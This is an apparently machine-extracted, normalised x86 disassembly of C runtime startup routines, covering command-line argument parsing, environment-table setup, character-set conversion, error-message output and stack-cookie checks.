mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc00002b4
je r-xdata
push [ esi + 0x8 ]
mov ecx edi
push 0x8
call [ r--data ]
call edi
pop ecx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov [ esi + 0x8 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc000008e
je r-xdata
mov [ esi + 0x8 ] 0x8e
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x8 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc000008f
je r-xdata
mov [ esi + 0x8 ] 0x8d
jmp r-xdata
mov [ esi + 0x8 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x8 ] 0x81
jmp r-xdata
sub_429a62
push 0x3
call sub_4365ba
pop ecx
cmp eax 0x1
jne r-xdata
test eax eax
jne r-xdata
mov al 0x1
retn
xor al al
retn
cmp [ rw-data ] 0x1
je r-xdata
sub_429a82
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0xfffffff4
call [ GetStdHandle@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
cmp esi 0xffffffff
je r-xdata
mov edx [ ebp + 0x8 ]
lea ecx [ ebp - 0x1f8 ]
xor eax eax
push eax
mov [ ebp - 0x5 ] al
mov [ ebp - 0x1fc ] eax
lea eax [ ebp - 0x1fc ]
push eax
lea eax [ ebp - 0x1f8 ]
sub ecx eax
dec ecx
push ecx
push eax
push esi
call [ WriteFile@IAT ]
mov ax [ edx ]
add edx 0x2
test ax ax
jne r-xdata
mov al [ edx ]
mov [ ecx ] al
inc ecx
lea eax [ ebp - 0x4 ]
cmp ecx eax
je r-xdata
sub_429aff
mov edi edi
push ebp
mov ebp esp
push 0x3
call sub_4365ba
pop ecx
cmp eax 0x1
je r-xdata
pop ebp
jmp sub_429a82
test eax eax
jne r-xdata
push ebx
push esi
push r--data
push 0x314
mov ebx rw-data
push ebx
call sub_436740
add esp 0xc
xor esi esi
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_42fdfc
int3
push edi
push 0x104
push rw-data
push esi
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov edi 0x2fb
test eax eax
jne r-xdata
mov ecx rw-data
lea edx [ ecx + 0x2 ]
push r--data
push edi
push rw-data
call sub_436740
add esp 0xc
test eax eax
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax si
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
cmp eax 0x3c
jbe r-xdata
push r--data
mov edi 0x314
push edi
push ebx
call sub_43666b
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ ecx * 2 + rw-data ]
mov eax ecx
sub eax rw-data
push 0x3
sar eax 0x1
push r--data
sub edi eax
push edi
push ecx
call sub_436871
add esp 0x10
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_43666b
add esp 0xc
pop edi
test eax eax
jne r-xdata
push 0x12010
push r--data
push ebx
call sub_436bce
add esp 0xc
pop esi
pop ebx
pop ebp
retn
sub_429c1e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_42fdfc
int3
pop ebp
retn
sub_429c6b
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_429c8a
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_429ceb
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ rw-data ]
mov ecx esi
xor esi [ rw-data ]
and ecx 0x1f
ror esi cl
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn
sub_429d7f
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x2
push esi
je r-xdata
push ebx
push edi
call sub_437d97
push 0x104
mov esi rw-data
xor edi edi
push esi
push edi
call [ GetModuleFileNameA@IAT ]
mov ebx [ rw-data ]
mov [ rw-data ] esi
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x1
je r-xdata
mov ebx esi
cmp [ ebx ] 0x0
jne r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push ebx
call sub_429ff6
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
call sub_42fef5
push 0xc
pop edi
mov [ eax ] edi
jmp r-xdata
lea eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] edi
push eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] edi
push eax
push edi
push edi
push ebx
call sub_429ff6
push 0x1
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
call sub_42a47b
mov esi eax
add esp 0x20
test esi esi
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push esi
call sub_437861
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ rw-data ] eax
mov eax esi
mov esi edi
mov [ rw-data ] eax
mov ebx edi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax edx
cmp [ edx ] edi
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
push esi
call sub_42d0aa
pop ecx
pop edi
mov eax ebx
pop ebx
mov eax edi
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] eax
mov ebx edi
mov [ rw-data ] edx
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] edi
jne r-xdata
push eax
call sub_42d0aa
pop ecx
mov [ ebp - 0x8 ] edi
sub_429ea3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x2
push esi
je r-xdata
push ebx
push edi
push 0x104
mov esi rw-data
xor edi edi
push esi
push edi
call [ GetModuleFileNameW@IAT ]
mov ebx [ rw-data ]
mov [ rw-data ] esi
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x1
je r-xdata
mov ebx esi
cmp [ ebx ] di
jne r-xdata
call sub_42fef5
push 0x16
pop esi
mov [ eax ] esi
call sub_42fdcf
mov eax esi
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push ebx
call sub_42a16b
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
call sub_42fef5
push 0xc
pop edi
mov [ eax ] edi
jmp r-xdata
lea eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] edi
push eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] edi
push eax
push edi
push edi
push ebx
call sub_42a16b
push 0x2
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
call sub_42a47b
mov esi eax
add esp 0x20
test esi esi
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push esi
call sub_43786c
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ rw-data ] eax
mov eax esi
mov esi edi
mov [ rw-data ] eax
mov ebx edi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax edx
cmp [ edx ] edi
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
push esi
call sub_42d0aa
pop ecx
pop edi
mov eax ebx
pop ebx
mov eax edi
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] eax
mov ebx edi
mov [ rw-data ] edx
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] edi
jne r-xdata
push eax
call sub_42d0aa
pop ecx
mov [ ebp - 0x8 ] edi
sub_429ff6
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
and [ ebx ] 0x0
mov edi [ ebp + 0x10 ]
mov [ eax ] 0x1
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
xor cl cl
mov [ ebp - 0x1 ] cl
mov [ eax ] edi
add eax 0x4
mov [ ebp + 0xc ] eax
inc [ ebx ]
test edi edi
je r-xdata
test cl cl
mov al 0x22
sete cl
inc esi
mov [ ebp - 0x1 ] cl
jmp r-xdata
mov al [ esi ]
inc esi
mov [ ebp - 0x2 ] al
movsx eax al
push eax
call sub_43835a
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
test cl cl
jne r-xdata
mov al [ ebp - 0x2 ]
test al al
je r-xdata
inc [ ebx ]
test edi edi
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x20
je r-xdata
dec esi
mov cl [ ebp - 0x1 ]
inc esi
mov al [ esi ]
mov [ edi ] al
inc edi
test edi edi
je r-xdata
cmp al 0x9
jne r-xdata
mov ecx [ ebp + 0xc ]
pop edi
pop esi
pop ebx
test ecx ecx
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov [ edi - 0x1 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov esp ebp
pop ebp
retn
and [ ecx ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x14 ]
inc [ eax ]
mov [ ecx ] edi
add ecx 0x4
mov [ ebp + 0xc ] ecx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc eax
cmp [ esi ] 0x22
jne r-xdata
test eax eax
jne r-xdata
test al 0x1
jne r-xdata
dec eax
test edi edi
je r-xdata
mov al [ esi ]
test al al
je r-xdata
shr eax 0x1
jmp r-xdata
mov cl [ ebp - 0x1 ]
test cl cl
je r-xdata
inc [ ebx ]
mov [ edi ] 0x5c
inc edi
test edi edi
je r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
xor edx edx
test cl cl
sete [ ebp - 0x1 ]
lea ecx [ esi + 0x1 ]
cmp [ ecx ] 0x22
jne r-xdata
inc [ ebx ]
jmp r-xdata
mov [ edi ] 0x0
inc edi
test edx edx
je r-xdata
cmp al 0x20
je r-xdata
mov cl [ ebp - 0x1 ]
mov esi ecx
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
test edi edi
je r-xdata
cmp al 0x9
je r-xdata
xor edx edx
inc edx
xor eax eax
jmp r-xdata
movsx eax [ esi ]
push eax
call sub_43835a
pop ecx
test eax eax
je r-xdata
mov [ edi ] al
inc edi
inc [ ebx ]
inc esi
inc [ ebx ]
test edi edi
je r-xdata
mov al [ esi ]
mov [ edi ] al
inc edi
sub_42a16b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x18 ]
mov [ edi ] ebx
mov [ eax ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0x8 ] 0x20
mov [ ebp - 0xc ] 0x9
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
inc [ edi ]
test edx edx
je r-xdata
test bl bl
sete bl
add ecx 0x2
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
test ax ax
je r-xdata
mov ax [ ecx ]
mov [ edx ] ax
add edx 0x2
test bl bl
jne r-xdata
sub ecx 0x2
push 0x22
pop eax
cmp ax [ ebp - 0x8 ]
je r-xdata
test esi esi
je r-xdata
movzx eax [ ecx ]
cmp ax [ ebp - 0x8 ]
je r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0xc ]
push 0x22
pop eax
jne r-xdata
inc [ ebx ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi ] eax
add ecx 0x2
jmp r-xdata
cmp ax [ ebp - 0xc ]
jne r-xdata
mov ebx [ ebp + 0x14 ]
xor eax eax
mov [ ebp - 0x1 ] al
xor eax eax
mov [ edx - 0x2 ] ax
jmp r-xdata
cmp [ ecx ] ax
jne r-xdata
xor eax eax
cmp [ ecx ] ax
je r-xdata
test esi esi
je r-xdata
inc [ ebx ]
xor ebx ebx
push 0x5c
pop esi
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
cmp [ ecx ] si
je r-xdata
add ecx 0x2
inc eax
push 0x22
pop esi
cmp [ ecx ] si
push 0x5c
pop esi
jne r-xdata
test eax eax
jne r-xdata
test al 0x1
jne r-xdata
dec eax
test edx edx
je r-xdata
movzx eax [ ecx ]
test ax ax
je r-xdata
mov edi [ ebp + 0x18 ]
shr eax 0x1
jmp r-xdata
cmp [ ebp - 0x1 ] bl
je r-xdata
inc [ edi ]
mov [ edx ] si
add edx 0x2
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
test edx edx
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ ebp - 0x1 ] bl
mov [ ebp - 0x10 ] ebx
sete [ ebp - 0x1 ]
push 0x22
pop esi
cmp [ ecx + 0x2 ] si
push 0x5c
pop esi
jne r-xdata
inc [ edi ]
xor eax eax
jmp r-xdata
xor eax eax
mov [ edx ] ax
add edx 0x2
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp ax [ ebp - 0x8 ]
je r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx ] ax
je r-xdata
add ecx 0x2
jmp r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0xc ]
je r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax ebx
jmp r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
sub_42a47b
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x3fffffff
jb r-xdata
push edi
or edi 0xffffffff
mov ecx [ ebp + 0xc ]
xor edx edx
mov eax edi
div [ ebp + 0x10 ]
cmp ecx eax
jae r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
imul ecx [ ebp + 0x10 ]
shl esi 0x2
sub edi esi
cmp edi ecx
ja r-xdata
pop esi
pop ebp
retn
pop edi
lea eax [ ecx + esi ]
push 0x1
push eax
call sub_42d196
push 0x0
mov esi eax
call sub_42d0aa
add esp 0xc
mov eax esi
sub_42a53e
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
cmp [ rw-data ] eax
jne r-xdata
call sub_42a59c
test eax eax
jne r-xdata
xor eax eax
retn
call sub_42a8f7
neg eax
sbb eax eax
not eax
and eax [ rw-data ]
sub_42a56d
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
cmp [ rw-data ] eax
jne r-xdata
call sub_42a5f5
test eax eax
jne r-xdata
xor eax eax
retn
call sub_42a976
neg eax
sbb eax eax
not eax
and eax [ rw-data ]
sub_42a59c
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
call sub_437d97
call sub_438569
mov esi eax
test esi esi
jne r-xdata
xor eax eax
retn
push esi
call sub_42a6c4
pop ecx
test eax eax
jne r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
mov ecx rw-data
mov [ rw-data ] eax
call sub_42ac27
xor edi edi
or edi 0xffffffff
jmp r-xdata
push esi
call sub_42d0aa
pop ecx
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_42d0aa
pop ecx
sub_42a5f5
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
call sub_4385ec
mov esi eax
test esi esi
jne r-xdata
xor eax eax
retn
push esi
call sub_42a795
pop ecx
test eax eax
jne r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
mov ecx rw-data
mov [ rw-data ] eax
call sub_42ac58
xor edi edi
or edi 0xffffffff
jmp r-xdata
push esi
call sub_42d0aa
pop ecx
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_42d0aa
pop ecx
sub_42a649
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor edx edx
mov al [ esi ]
test al al
je r-xdata
mov eax edx
pop esi
pop ebp
retn
push edi
mov ecx esi
lea edi [ ecx + 0x1 ]
inc edx
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edi
inc esi
add esi ecx
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x3d
je r-xdata
pop edi
sub_42a67d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov edx ebx
movzx eax [ esi ]
test ax ax
je r-xdata
pop esi
mov eax edx
pop ebx
pop ebp
retn
push edi
mov ecx esi
lea edi [ ecx + 0x2 ]
inc edx
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
sub ecx edi
sar ecx 0x1
lea esi [ esi + ecx * 2 ]
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
cmp ax 0x3d
je r-xdata
pop edi
sub_42a6c4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor edx edx
mov esi edi
mov al [ edi ]
jmp r-xdata
test al al
jne r-xdata
cmp al 0x3d
je r-xdata
lea eax [ edx + 0x1 ]
push 0x4
push eax
call sub_42d196
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov ecx esi
lea ebx [ ecx + 0x1 ]
inc edx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx ebx
inc esi
add esi ecx
mov al [ esi ]
cmp [ edi ] 0x0
jne r-xdata
mov ecx edi
lea edx [ ecx + 0x1 ]
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx edx
cmp [ edi ] 0x3d
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x8 ] eax
je r-xdata
push 0x0
call sub_42d0aa
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
add edi eax
push 0x1
push eax
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push ebx
call sub_42a88f
push 0x0
call sub_42d0aa
pop ecx
pop ecx
push edi
push [ ebp - 0x8 ]
push esi
call sub_42cfc7
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
mov eax [ ebp - 0x4 ]
push 0x0
mov [ eax ] esi
add eax 0x4
mov [ ebp - 0x4 ] eax
call sub_42d0aa
mov eax [ ebp - 0x8 ]
pop ecx
sub_42a795
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x8 ] eax
mov edx eax
push esi
push edi
movzx eax [ ebx ]
mov esi ebx
test ax ax
je r-xdata
lea eax [ edx + 0x1 ]
push 0x4
push eax
call sub_42d196
mov edi eax
xor esi esi
pop ecx
pop ecx
test edi edi
je r-xdata
push 0x3d
pop ebx
mov edi esi
mov [ ebp - 0x4 ] edi
jmp r-xdata
mov ecx esi
lea edi [ ecx + 0x2 ]
inc edx
cmp [ ebx ] si
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x8 ]
jne r-xdata
sub ecx edi
sar ecx 0x1
lea esi [ esi + ecx * 2 ]
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x2 ]
jmp r-xdata
cmp ax bx
je r-xdata
mov ebx [ ebp + 0x8 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax si
jne r-xdata
sub ecx edx
sar ecx 0x1
push 0x3d
lea eax [ ecx + 0x1 ]
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebx ] cx
je r-xdata
push esi
call sub_42d0aa
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ebx [ ebx + eax * 2 ]
push 0x2
push eax
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
call sub_42a8be
xor esi esi
push esi
call sub_42d0aa
pop ecx
pop ecx
push ebx
push [ ebp - 0x8 ]
push esi
call sub_436740
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_42fdfc
int3
mov eax [ ebp - 0x4 ]
mov [ eax ] esi
xor esi esi
add eax 0x4
push esi
mov [ ebp - 0x4 ] eax
call sub_42d0aa
mov eax [ ebp - 0x8 ]
pop ecx
sub_42a88f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
push edi
mov edi esi
jmp r-xdata
test eax eax
jne r-xdata
push eax
call sub_42d0aa
lea edi [ edi + 0x4 ]
mov eax [ edi ]
pop ecx
push esi
call sub_42d0aa
pop ecx
pop edi
sub_42a8be
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
push edi
mov edi esi
jmp r-xdata
test eax eax
jne r-xdata
push eax
call sub_42d0aa
lea edi [ edi + 0x4 ]
mov eax [ edi ]
pop ecx
push esi
call sub_42d0aa
pop ecx
pop edi
sub_42a8f7
mov edi edi
push edi
mov edi [ rw-data ]
test edi edi
jne r-xdata
push ebx
push esi
xor ebx ebx
jmp r-xdata
or eax 0xffffffff
pop edi
retn
cmp [ edi ] ebx
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push 0xffffffff
push [ edi ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
or eax 0xffffffff
jmp r-xdata
push 0x1
push ebx
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
push esi
call sub_42d0aa
pop ecx
push 0x0
push 0x0
push ebx
push esi
push 0xffffffff
push [ edi ]
xor ebx ebx
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
push ebx
push esi
call sub_438e62
push ebx
call sub_42d0aa
add esp 0xc
add edi 0x4
sub_42a976
mov edi edi
push edi
mov edi [ rw-data ]
test edi edi
jne r-xdata
push ebx
push esi
xor ebx ebx
jmp r-xdata
or eax 0xffffffff
pop edi
retn
cmp [ edi ] ebx
jne r-xdata
push ebx
push ebx
push 0xffffffff
push [ edi ]
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
or eax 0xffffffff
jmp r-xdata
push 0x2
push ebx
call sub_42d196
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
push esi
call sub_42d0aa
pop ecx
push ebx
push esi
push 0xffffffff
push [ edi ]
xor ebx ebx
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push ebx
push esi
call sub_438e6d
push ebx
call sub_42d0aa
add esp 0xc
add edi 0x4
sub_42aa1f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42cfc7
add esp 0xc
pop ebp
retn
sub_42aa3d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push [ eax ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_436740
add esp 0xc
pop ebp
retn
sub_42aa5b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
pop ebp
retn
sub_42aa73
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
pop ebp
retn
sub_42aa91
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
jmp r-xdata
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
push esi
call [ r--data ]
call [ ebp + 0x8 ]
pop ecx
add esi 0x4
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_42aad1
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
jmp r-xdata
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
push esi
call [ r--data ]
call [ ebp + 0x8 ]
pop ecx
add esi 0x4
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
sub_42ab81
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call [ MultiByteToWideChar@IAT ]
pop ebp
retn
sub_42ab9b
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push eax
push eax
push eax
push 0xffffffff
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call [ WideCharToMultiByte@IAT ]
pop ebp
retn
sub_42abd4
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0xffffffff
push [ ebp + 0xc ]
push eax
push [ ebp + 0x8 ]
call [ WideCharToMultiByte@IAT ]
pop ebp
retn
sub_42ac27
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_42ac58
mov edi edi
push ebp
mov ebp esp
lea eax [ ecx + 0x4 ]
mov edx eax
sub edx ecx
add edx 0x3
push esi
xor esi esi
shr edx 0x2
cmp eax ecx
sbb eax eax
not eax
and eax edx
je r-xdata
pop esi
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
inc esi
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp esi eax
jne r-xdata
sub_42acc9
push sub_42ab11
mov ecx rw-data
call sub_42aa91
push sub_42ab2c
mov ecx rw-data
call sub_42aad1
push [ rw-data ]
call sub_42a88f
push [ rw-data ]
call sub_42a8be
pop ecx
pop ecx
retn
sub_42ad3e
mov edi edi
push ebx
push esi
call sub_437d97
mov esi [ rw-data ]
test esi esi
jne r-xdata
xor bl bl
mov esi rw-data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movsx eax al
push eax
call sub_43835a
pop ecx
test eax eax
je r-xdata
test bl bl
sete bl
mov eax esi
pop esi
pop ebx
retn
test bl bl
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
mov al [ esi ]
cmp al 0x20
jg r-xdata
cmp al 0x20
jg r-xdata
inc esi
sub_42ad91
mov eax [ rw-data ]
test eax eax
jne r-xdata
push esi
push 0x20
xor dl dl
pop esi
mov eax rw-data
cmp ecx 0x22
jne r-xdata
test cx cx
je r-xdata
add eax 0x2
jmp r-xdata
test dl dl
sete dl
pop esi
retn
test dl dl
je r-xdata
movzx ecx [ eax ]
cmp cx si
ja r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx si
ja r-xdata
add eax 0x2
sub_42ae04
mov edi edi
push ebx
push esi
call sub_437d97
mov esi [ rw-data ]
test esi esi
jne r-xdata
xor bl bl
